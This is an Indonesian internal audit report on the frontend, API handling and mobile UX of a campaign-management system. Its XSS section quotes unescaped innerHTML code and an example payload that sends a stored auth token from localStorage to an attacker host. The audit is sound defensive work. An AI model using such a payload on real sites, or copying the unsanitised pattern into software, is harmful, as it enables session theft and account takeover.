# LAPORAN AUDIT SISTEM: FRONTEND, API & UX AUDIT
## Sistem Informasi Manajemen Pemenangan Gus Dim (Dapil Kraksaan Raya)

Tanggal Audit: 18 Oktober 2026  
Status Repository: Branch main (Commit 106c5d1)  
Klasifikasi Dokumen: Confidential / Internal Engineering Report  
Versi Dokumen: 1.0.0  

---

### 1. ARSITEKTUR FRONTEND: DESKTOP CLIENT VS MOBILE PWA

Sistem menyediakan dua antarmuka pengguna yang dibangun secara terpisah untuk dua skenario operasional yang berbeda:

```text
+-----------------------+----------------------------------+----------------------------------+
| Karakteristik         | Desktop Client                   | Mobile Client (PWA)              |
+-----------------------+----------------------------------+----------------------------------+
| Berkas Utama          | `Index.html` (2.086 baris)       | `mobile/index.html` (9.658 baris)|
| Logika Skrip          | `assets/js/app.js` (4.351 baris) | Inline di `mobile/index.html`    |
| Gaya Visual (CSS)     | `assets/css/style.css`           | `mobile/assets/css/mobile.css`   |
| Target Pengguna       | Admin DPC, Saksi Pusat, Tim IT   | Koordinator Desa, Relawan TPS    |
| Pola Desain Antarmuka | Multi-panel Dashboard Grid       | Native-feel App Bottom Nav PWA   |
| Kemampuan Offline     | Tidak Ada (Bypass Network)       | Cache PWA Asset (Service Worker) |
| Integrasi Real-Time   | Pusher / Reverb JS               | Pusher / Reverb JS               |
+-----------------------+----------------------------------+----------------------------------+
```

---

### 2. AUDIT KEAMANAN CLIENT-SIDE: SANITASI OUTPUT & XSS

Perbandingan signifikan ditemukan pada tata kelola keamanan sisi klien antara antarmuka Desktop dan Mobile:

#### A. Kerentanan Stored XSS pada Desktop (`assets/js/app.js`):
- Berkas `assets/js/app.js` TIDAK MEMILIKI fungsi utilitas sanitasi teks seperti `escapeHtml()`.
- Data yang diterima dari API langsung dikonkat secara mentah ke dalam properti `innerHTML` elemen DOM:
  ```javascript
  // assets/js/app.js:349
  card.innerHTML =
    avatarHtml +
    '<div class="people-card-info">' +
      '<div class="people-card-nama">' + r.nama + '</div>' +
      '<div class="people-card-sub">' + (subInfo || '-') + '</div>' +
    '</div>' + ...;
  ```
  ```javascript
  // assets/js/app.js:1866
  tbody.innerHTML = rows.map(r => `
    <tr>
      <td>${r.nama}</td>
      <td>${r.nik}</td>
      <td>${r.alamat}</td>
      <td>${r.catatan}</td>
    </tr>
  `).join('');
  ```
- **Dampak Keamanan**: Apabila seorang pengguna lapangan memasukkan muatan XSS pada kolom nama warga (misalnya: `<img src=x onerror="fetch('https://attacker.com/steal?t='+localStorage.getItem('dprd_token'))">`), skrip tersebut akan dieksekusi secara otomatis di browser Superadmin saat membuka tabel data atau daftar verifikasi, berujung pada pembajakan akun (Account Takeover).

#### B. Implementasi Sanitasi pada Mobile (`mobile/index.html`):
- Berkas `mobile/index.html` (baris 9268) telah mendefinisikan fungsi sanitasi:
  ```javascript
  function escapeHtml(text) {
    if (!text) return '';
    return String(text)
      .replace(/&/g, '&amp;')
      .replace(/</g, '&lt;')
      .replace(/>/g, '&gt;')
      .replace(/"/g, '&quot;')
      .replace(/'/g, '&#039;');
  }
  ```
- Fungsi ini digunakan secara luas pada template string kartu pendukung, timeline riwayat verifikasi, dan form edit mobile:
  ```javascript
  // mobile/index.html:7845
  <h3 style="font-size:17px;font-weight:800;color:#0f172a;">${escapeHtml(item.nama)}</h3>
  ```
- **Evaluasi**: Antarmuka Mobile memiliki pertahanan terhadap XSS yang jauh lebih matang dibandingkan antarmuka Desktop. Logika sanitasi ini harus diangkat dan diintegrasikan ke `assets/js/app.js`.

---

### 3. INTEGRASI API CLIENT & PENANGANAN SESI

Kedua klien berkomunikasi dengan server menggunakan fungsi wrapper HTTP Fetch:
- Desktop: `fetchApi(endpoint, method, data)` di `assets/js/app.js` (baris 78-100).
- Mobile: `fetchMobileApi(endpoint, method, data)` di `mobile/index.html`.

#### A. Evaluasi Mekanisme Otentikasi:
- Token disimpan pada `localStorage` browser dengan kunci `'dprd_token'`.
- Setiap request menyertakan header `Authorization: Bearer <token>` dan `X-Requested-With: XMLHttpRequest`.
- Jika server mengembalikan status HTTP `401 Unauthorized`, fungsi adapter menghapus token dari `localStorage` dan mereset variabel global `SESSION_TOKEN` serta `CURRENT_USER`.

#### B. Kelemahan Penanganan Kesalahan (Error Handling):
1. **Kegagalan Parsing JSON saat Server Error**:
   ```javascript
   const res = await fetch(API_BASE_URL + '/' + endpoint, options);
   const json = await res.json();
   ```
   Jika server mengalami fatal error (HTTP 500) atau mode maintenance mengembalikan halaman HTML 503, pemanggilan `res.json()` melemparkan unhandled exception `SyntaxError: Unexpected token '<'`, menyebabkan antarmuka freeze tanpa pesan kesalahan yang ramah bagi pengguna.
2. **Ketiadaan Refresh Token**:
   Sistem tidak memiliki mekanisme pembaruan token otomatis (refresh token). Token memiliki masa berlaku 30 hari; jika kedaluwarsa saat pengguna sedang mengisi formulir panjang di lapangan, seluruh data yang diinput hilang saat tombol simpan ditekan.

---

### 4. MANAJEMEN STATE & DATA RETRIEVAL PATTERNS

#### A. Global State Cluttering:
Aplikasi desktop dan mobile mengandalkan variabel global di level `window`:
- `SESSION_TOKEN`, `CURRENT_USER`, `DASHBOARD_DATA`, `RIWAYAT_DATA`, `SELECTED_ROW`.
- Keberadaan puluhan variabel global tanpa sistem state management formal (seperti Pinia, Redux, atau Reactive Signals) meningkatkan risiko bug race condition saat beberapa request asinkron berjalan bersamaan.

#### B. Pola Polling & WebSocket Fallback:
- Saat event WebSocket Reverb diterima, klien tidak meminta patch diferensial, melainkan memanggil ulang endpoint secara menyeluruh (`getDashboardData()`).
- Hal ini menimbulkan lonjakan beban query di backend jika terjadi aktivitas bersamaan saat acara kampanye akbar.

---

### 5. PENGALAMAN PENGGUNA MOBILE (MOBILE UX) & PWA

#### A. Deteksi Perangkat & Pengalihan Otomatis:
Pada `Index.html` (baris 4-25) dan `backend/resources/views/dashboard.blade.php`:
```javascript
var isMobileDevice = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
var isMobileWidth = window.innerWidth <= 768;
if (isMobileDevice || isMobileWidth) {
    window.location.replace('/mobile');
}
```
Mekanisme ini bekerja dengan baik dan mulus dalam mengarahkan pengguna ponsel pintar ke antarmuka yang teroptimasi sentuhan.

#### B. Evaluasi Touch Targets & Komponen Mobile:
1. **Bottom Navigation**: Telah disesuaikan dengan tinggi area sentuh ergonomis (48px+), pemisahan jelas antara menu reguler dan floating action button entri data berwarna oranye di tengah.
2. **Kartu Pendukung Compact**: Informasi NIK tersamarkan, status verifikasi dengan badge warna kontras, tombol cepat WhatsApp dan Detail berukuran proporsional.
3. **Formulir Input Teritorial Dinamis**: Pemilihan Kecamatan (Kraksaan, Besuk, Gading) secara reaktif memperbarui daftar Desa yang bersangkutan melalui objek pemetaan `DapilLocations`.
4. **Peta Sebaran Spasial (Leaflet)**: Peta dimuat secara responsif dengan penanda warna berbeda berdasarkan wilayah kecamatan, dilengkapi kontrol zoom yang nyaman dioperasikan satu tangan.

#### C. Keterbatasan Validasi Input Sisi Klien:
- Input nomor handphone belum memvalidasi panjang digit nomor seluler operator Indonesia (10-13 digit).
- Validasi NIK hanya memeriksa panjang karakter (16 digit), belum memverifikasi struktur tanggal lahir atau kode wilayah kemendagri.
